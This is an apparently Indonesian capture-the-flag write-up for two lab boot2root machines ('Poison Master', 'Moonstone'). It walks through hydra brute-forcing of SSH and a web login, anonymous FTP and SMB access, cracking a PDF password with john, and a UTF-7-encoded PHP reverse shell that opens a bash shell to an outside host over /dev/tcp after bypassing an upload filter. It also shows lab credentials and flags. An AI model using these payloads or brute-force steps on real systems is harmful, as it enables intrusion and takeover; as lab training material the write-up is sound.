+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.1.2.234 ssh -t <span class="m">4</span></span></span></code></pre></div></div>
+<ul>
+<li>Found SSH password for user <code>ubmaj</code> that is: <code>princess</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-10.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-10.png, /images/hacktrace-ranges_boot2root2-10.png 1.5x, /images/hacktrace-ranges_boot2root2-10.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-10.png"
+        title="Poison Master-10" width="696" height="61" /></p>
+<h3 id="remote-ssh-to-target-server">Remote SSH to Target Server</h3>
+<ul>
+<li>Langsung saja lakukan remote ke server target menggunakan kredensial SSH yang telah didapatkan:
+<ul>
+<li><strong>ubmaj : princess</strong></li>
+</ul>
+</li>
+<li>Setelah berhasil login ke remote SSH, langsung saja read user flag.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-11.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-11.png, /images/hacktrace-ranges_boot2root2-11.png 1.5x, /images/hacktrace-ranges_boot2root2-11.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-11.png"
+        title="Poison Master-11" width="612" height="114" /></p>
+<h2 id="user-flag-1">User Flag</h2>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>9f752edba37a6dbe680219e472ad2b85</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="3-moonstone">3. Moonstone</h1>
+<h2 id="detail-tantangan-2">Detail Tantangan</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Level</th>
+          <th>Moderate</th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Points</td>
+          <td>50 (User) &amp; 50 (Root)</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Machine IP</td>
+          <td>10.1.2.232</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Machine OS</td>
+          <td>Linux</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="langkah-penyelesaian-2">Langkah Penyelesaian</h2>
+<h3 id="port--service-enumeration-2">Port &amp; Service Enumeration</h3>
+<ul>
+<li>Hasil port scanning menggunakan tool: <code>rustscan</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rustscan -a 10.1.2.232 -r 1-65535 --scripts default <span class="p">|</span> tee -a output_scan_all_ports.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-01.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-01.png, /images/hacktrace-ranges_boot2root3-01.png 1.5x, /images/hacktrace-ranges_boot2root3-01.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-01.png"
+        title="Moonstone-01" width="411" height="194" /></p>
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<ul>
+<li>Terdapat celah FTP misconfiguration, di mana attacker dapat login sebagai user <code>anonymous</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp anonymous@10.1.2.232 <span class="c1"># login without password.</span></span></span></code></pre></div></div>
+<ul>
+<li>Terdapat 3 folder yang di dalamnya terdapat file-file yang interesting.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-02.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-02.png, /images/hacktrace-ranges_boot2root3-02.png 1.5x, /images/hacktrace-ranges_boot2root3-02.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-02.png"
+        title="Moonstone-02" width="715" height="409" /></p>
+<ul>
+<li>Langsung saja saya download semua file di setiap foldernya. Total ada <strong>6 file</strong>, 3 di antaranya file zip dan 3 sisanya adalah file dummy SQL.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-03.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-03.png, /images/hacktrace-ranges_boot2root3-03.png 1.5x, /images/hacktrace-ranges_boot2root3-03.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-03.png"
+        title="Moonstone-03" width="814" height="231" /></p>
+<ul>
+<li>Dari semua file tersebut, hanya ada 1 file zip yang bisa dibuka, yaitu: <code>YourSpace_Dev.zip</code>.</li>
+<li>Setelah diekstrak, muncul folder yang berisi source code <strong>CodeIgniter 4</strong> (lanjut ke bagian <em><strong>finding the secrets</strong></em>).</li>
+</ul>
+<h3 id="smb-enumeration-1">SMB Enumeration</h3>
+<ul>
+<li>Karena port 445 terbuka dan terdapat celah dapat login sebagai anonymous, maka dari itu saya langsung coba melihat ada file apa saja di dalam shared folder <code>Backup</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient -L //10.1.2.232/Backup --option<span class="o">=</span><span class="s2">&#34;client min protocol=SMB2&#34;</span></span></span></code></pre></div></div>
+<ul>
+<li>Setelah saya coba masuk ke shared folder <code>Backup</code>, terdapat folder baru yang sebelumnya tidak ada di FTP server, yaitu: <code>2024_07</code>.</li>
+<li>Di dalam folder tersebut, terdapat beberapa file tambahan yang cukup interesting.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-04.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-04.png, /images/hacktrace-ranges_boot2root3-04.png 1.5x, /images/hacktrace-ranges_boot2root3-04.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-04.png"
+        title="Moonstone-04" width="861" height="257" /></p>
+<ul>
+<li>Tapi, hanya ada 1 file yang beneran bisa dibuka, yaitu: <code>Audit Report (3).pdf</code>.</li>
+<li>Masalahnya, file tersebut diproteksi oleh password, sehingga harus dibrute force menggunakan tool: <code>pdf2john</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pdf2john <span class="s2">&#34;Audit Report (3).pdf&#34;</span> &gt; audit_report_3.hash</span></span></code></pre></div></div>
+<ul>
+<li>Setelah itu, tinggal crack saja menggunakan tool: <code>john</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --show --format<span class="o">=</span>PDF audit_report_3.hash</span></span></code></pre></div></div>
+<ul>
+<li>Found password for pdf file: <code>janganlupa</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-05.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-05.png, /images/hacktrace-ranges_boot2root3-05.png 1.5x, /images/hacktrace-ranges_boot2root3-05.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-05.png"
+        title="Moonstone-05" width="550" height="112" /></p>
+<ul>
+<li>Setelah file pdf tersebut dibuka, di <strong>halaman 5</strong> (terakhir) terdapat daftar password yang mungkin berguna untuk nantinya.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-06.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-06.png, /images/hacktrace-ranges_boot2root3-06.png 1.5x, /images/hacktrace-ranges_boot2root3-06.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-06.png"
+        title="Moonstone-06" width="936" height="551" /></p>
+<h3 id="rpc-enumeration-2">RPC Enumeration</h3>
+<ul>
+<li>Sama seperti challenge-challenge sebelumnya, kita bisa memanfaatkan celah null session pada RPC service untuk bisa melakukan enumerasi.</li>
+<li>Awalnya, ketika saya coba manual enumerasi user pada RPC service menggunakan perintah <code>enumdomusers</code>, hanya ada terdapat 7 user saja, tetapi ketika menggunakan tool: <code>enum4linux</code> terdapat 2 user baru, yaitu:
+<ul>
+<li><strong>jay_payakumbuah</strong>, dan</li>
+<li><strong>ayyub</strong>.</li>
+</ul>
+</li>
+<li>Jadi, total ada <strong>9 user</strong> yang berguna untuk nantinya.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-07.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-07.png, /images/hacktrace-ranges_boot2root3-07.png 1.5x, /images/hacktrace-ranges_boot2root3-07.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-07.png"
+        title="Moonstone-07" width="836" height="290" /></p>
+<h3 id="finding-the-secrets">Finding The Secrets</h3>
+<ul>
+<li>Diketahui bahwa aplikasi yang berjalan di port <strong>8080</strong> dan dibuat menggunakan <strong>CodeIgniter 4</strong> (PHP-based web framework).</li>
+<li>Ketika dibuka, muncul halaman login. Langsung saja saya coba brute force login http-form menggunakan informasi user dan password yang sudah diperoleh sebelumnya menggunakan tool: <code>hydra</code> dengan provide list user dan password yang telah diketahui sebelumnya.</li>
+</ul>
+<p><code>users.txt</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-txt">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ayyub
+</span></span><span class="line"><span class="cl">donghyuk_kim
+</span></span><span class="line"><span class="cl">yeji_hwang
+</span></span><span class="line"><span class="cl">azkira_kim
+</span></span><span class="line"><span class="cl">bryan_jung
+</span></span><span class="line"><span class="cl">nurul_lee
+</span></span><span class="line"><span class="cl">yuna_shin
+</span></span><span class="line"><span class="cl">hanbin_kim
+</span></span><span class="line"><span class="cl">jay_payakumbuah</span></span></code></pre></div></div>
+<p><code>pass.txt</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-txt">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">P@ssw0rd
+</span></span><span class="line"><span class="cl">T4da1mA!
+</span></span><span class="line"><span class="cl">Lzj*7BL%#fMhq</span></span></code></pre></div></div>
+<ul>
+<li>Berikut adalah full command hydra untuk bruteforce http form loginnya (bisa juga pakai NSE <code>http-form-brute</code> dari <code>nmap</code>).</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L users.txt -P pass.txt -s <span class="m">8080</span> 10.1.2.232 http-post-form <span class="s2">&#34;/authenticate:username=^USER^&amp;password=^PASS^:login_failed&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># You can check the path and login parameter by intercepting the traffic via burp suite.</span></span></span></code></pre></div></div>
+<ul>
+<li>Terdapat beberapa file yang menarik perhatian saya, yaitu file <code>yourspace/.env</code> dan <code>yourspace/public/info.asp</code>.</li>
+</ul>
+<p><code>.env</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Example Environment Configuration file</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This file can be used as a starting point for your own</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># custom .env files, and contains most of the possible settings</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># available in a default install.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># By default, all of the settings are commented out. If you want</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># to override the setting, you must un-comment it by removing the &#39;#&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># at the beginning of the line.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ENVIRONMENT</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">CI_ENVIRONMENT</span> <span class="o">=</span> development
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># APP</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># app.baseURL = &#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># If you have trouble with `.`, you could also use `_`.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># app_baseURL = &#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># app.forceGlobalSecureRequests = false</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># app.CSPEnabled = false</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># DATABASE</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">database.default.hostname <span class="o">=</span> localhost
+</span></span><span class="line"><span class="cl">database.default.database <span class="o">=</span> yourspace
+</span></span><span class="line"><span class="cl">database.default.username <span class="o">=</span> rafi
+</span></span><span class="line"><span class="cl">database.default.password <span class="o">=</span> password
+</span></span><span class="line"><span class="cl">database.default.DBDriver <span class="o">=</span> MySQLi
+</span></span><span class="line"><span class="cl"><span class="c1"># database.default.DBPrefix =</span>
+</span></span><span class="line"><span class="cl">database.default.port <span class="o">=</span> <span class="m">3306</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># If you use MySQLi as tests, first update the values of Config\Database::$tests.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.hostname = localhost</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.database = ci4_test</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.username = root</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.password = root</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.DBDriver = MySQLi</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.DBPrefix =</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.charset = utf8mb4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.DBCollat = utf8mb4_general_ci</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database.tests.port = 3306</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ENCRYPTION</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># encryption.key =</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># SESSION</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># session.driver = &#39;CodeIgniter\Session\Handlers\FileHandler&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># session.savePath = null</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># LOGGER</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># logger.threshold = 4</span></span></span></code></pre></div></div>
+<p><code>info.asp</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">phpinfo</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></div>
+<ul>
+<li>Pada file <code>.env</code> terdapat kredensial database, tapi karena port 3306 tidak terbuka, maka dari itu, file tersebut tidak berguna untuk sekarang (mungkin ketika berhasil mendapatkan shell).</li>
+<li>Pada file <code>info.asp</code> berisikan fungsi <code>phpinfo()</code> untuk menampilkan informasi terkait versi PHP yang digunakan.</li>
+</ul>
+<h3 id="gaining-access-w-php-reverse-shell">Gaining Access w/ PHP Reverse Shell</h3>
+<ul>
+<li>Setelah berhasil login menggunakan username: <code>jay_payakumbuah</code> dengan password: <code>Lzj*7BL%#fMhq</code>, kemudian saya coba lihat isi di dalam webnya, ternyata ada satu fitur untuk upload sebuah dokumen yang bisa dimanfaatkan sebagai celah <em><strong>arbitrary file upload</strong></em>.</li>
+<li>Saya coba analisis lagi source code PHP yang tertera di folder <code>yourspace</code> sebelumnya.</li>
+<li>Setelah penantian cukup panjang, saya menyadari bahwa fitur tersebut pasti ada di sebuah <strong>Controllers</strong>, detailnya ada di file <code>MedicalController.php</code> (<em>lebih lengkapnya baca terkait arsitektur folder MVC pada framework CodeIgniter</em>).</li>
+<li>Terdapat limitasi pada fungsi upload file, yaitu:
+<ul>
+<li>Jika file yang di upload berekstensi <strong>.php, .pht, atau .phtml</strong>, maka terdeteksi sebagai malicious file.</li>
+<li>Jika ada tag pembuka php (<code>&lt;?</code>) di dalam konten yang di upload, maka terdeteksi juga sebagai malicious file.</li>
+</ul>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-08.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-08.png, /images/hacktrace-ranges_boot2root3-08.png 1.5x, /images/hacktrace-ranges_boot2root3-08.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-08.png"
+        title="Moonstone-08" width="1217" height="639" /></p>
+<ul>
+<li>Untuk membypass hal tersebut, saya coba baca lagi informasi <code>http://10.1.2.232/info.asp</code> untuk melihat apakah ada celah yang bisa dimanfaatkan untuk bypass limitasi tadi.</li>
+<li>Ternyata, di bagian <code>zend.script_encoding</code> bisa juga menggunakan <code>UTF-7</code>, yang mana memungkinkan untuk untuk bisa mendapatkan reverse shell asal payloadnya dalam format <code>UTF-7</code>. Ini payload lengkapnya:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">+</span><span class="nx">ADw</span><span class="o">-?</span><span class="nx">php</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;bash -i +AD4-&amp; /dev/tcp/10.18.200.127/4444 0+AD4-&amp;1&#34;</span><span class="p">)</span> <span class="o">?+</span><span class="nx">AD4</span><span class="o">-</span></span></span></code></pre></div></div>
+<ul>
+<li>Untuk tanda <code>&lt;</code> di-encode ke <code>UTF-7</code> menjadi: <code>+ADw-</code>. Dan tanda <code>&gt;</code> menjadi: <code>+AD4-</code> (lebih lengkapnya baca artikel berikut: <a href="https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python%29" target="_blank" rel="noopener noreffer ">https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python)</a>.</li>
+<li>Tetapi, setelah coba di upload masih gagal, karena kenapa ? karena by default ekstensinya adalah <code>.asp</code> (agak menjengkelkan sih ini wkwk). Hal itu dibuktikan dengan fungsi <code>phpinfo()</code> yang tetap berjalan meskipun ekstensi filenya <code>.asp</code>.</li>
+<li>Oke fix upload dan jangan lupa untuk listen ke port <code>4444</code> menggunakan <code>nc</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">4444</span></span></span></code></pre></div></div>
+<ul>
+<li>Kalau berhasil, maka kita berhasil mendapatkan <strong>reverse shell</strong>.</li>
+</ul>
+<h3 id="remote-ssh-to-target-server-1">Remote SSH to Target Server</h3>
+<ul>
+<li>Setelah berhasil masuk dengan reverse shell, current user pastinya adalah <code>www-data</code>.</li>
+<li>Saya coba cari flag usernya, ternyata flag ada di direktori <code>/home/ayyub/user.txt</code>.</li>
+<li>File tersebut memiliki permission <code>r-x,r--,---</code> (<strong>540</strong>) yang berarti <strong>other tidak bisa membaca file tersebut</strong>.</li>
+<li>Saya coba lakukan enumerasi secara manual dan terpikir untuk melihat file <code>.env</code> yang ada di remote server.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-09.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-09.png, /images/hacktrace-ranges_boot2root3-09.png 1.5x, /images/hacktrace-ranges_boot2root3-09.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-09.png"
+        title="Moonstone-09" width="527" height="194" /></p>
+<ul>
+<li>Dari informasi kredensial database yang ada di file <code>.env</code>, saya mencoba untuk remote SSH menggunakan password yang tertera di file tersebut dan <strong>Alhamdulillah</strong>! saya berhasil login sebagai user <code>ayyub</code>.
+<ul>
+<li><strong>Username</strong>: ayyub</li>
+<li><strong>Password</strong>: B6CHkw$5BTaN%</li>
+</ul>
+</li>
+<li>Intinya, belum tentu kredensial database tersebut khusus untuk login ke db, bisa saja ke SSH atau service-service lain :))</li>
+<li>Berikut POC setelah saya berhasil remote SSH ke user <code>ayyub</code> dan mendapatkan flag usernya:</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root3-10.png"
+        data-srcset="/images/hacktrace-ranges_boot2root3-10.png, /images/hacktrace-ranges_boot2root3-10.png 1.5x, /images/hacktrace-ranges_boot2root3-10.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root3-10.png"
+        title="Moonstone-10" width="674" height="120" /></p>
+<h2 id="user-flag-2">User Flag</h2>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>ab40b8d326bcddb72f674759d6c09ccc</strong></div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-18</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/national/">National</a>,&nbsp;<a href="/tags/boot2root/">Boot2root</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/08/litctf-2024-quals-writeup/" class="prev" rel="prev" title="LITCTF 2024 Quals Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>LITCTF 2024 Quals Writeup</a>
+            <a href="/2024/09/slashroot-ctf-8.0-quals-writeup/" class="next" rel="next" title="Slashroot CTF 8.0 Quals Writeup">Slashroot CTF 8.0 Quals Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
